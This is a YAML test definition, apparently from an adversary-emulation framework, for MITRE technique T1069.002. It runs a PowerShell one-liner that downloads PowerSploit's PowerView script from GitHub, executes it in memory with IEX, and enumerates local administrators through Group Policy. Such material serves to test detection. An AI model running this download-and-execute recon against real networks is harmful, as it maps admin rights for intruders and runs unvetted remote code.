api_version: "2.0"
name: Find Local Admins via Group Policy (PowerView)
description: |
    takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.
args:
    - name: computer_name
      type: path
      default: $env:COMPUTERNAME
uuid: 64fdb43b-5259-467a-b000-1b02c00e510a
mitre:
    tactics:
        - 'TA0007: Discovery'
    techniques:
        - 'T1069: Permission Groups Discovery'
    subtechniques:
        - 'T1069.002: Domain Groups'
requirements:
    platforms:
        - os: windows
steps:
    - name: find-local-admins-via-group-policy-(powerview)
      inline: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName {{.Args.computer_name}} -Verbose
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
